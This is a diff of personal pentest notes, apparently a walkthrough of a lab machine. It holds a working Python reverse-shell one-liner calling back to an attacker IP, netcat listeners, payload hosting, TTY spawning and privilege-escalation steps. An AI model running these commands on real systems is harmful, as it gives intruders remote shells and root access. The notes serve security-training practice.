@@ -43,17 +43,24 @@ searchsploit Apache 2.4
 
 php reverse shell - pentestmonkey
 pentestmonkey reverse shell sheet cheat
-chg php IP + Port
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+chg php: IP + Port
 
 local> python -m SimpleHTTPServer 80
 wget na machine
 nc -nvlp 4445 (netcat)
 load 10.10.10.68/php-reverse-shell.php
 
+Goo: netsec spawning a TTY shell
+https://netsec.ws/?p=337
+python -c 'import pty; pty.spawn("/bin/bash")'
+sudo -u scriptmanager /bin/bash
+
 privilege escalation:
 
 cd scripts
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.13.28",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 local> python -m SimpleHTTPServer 80
 wget na machine
 nc -nvlp 1234
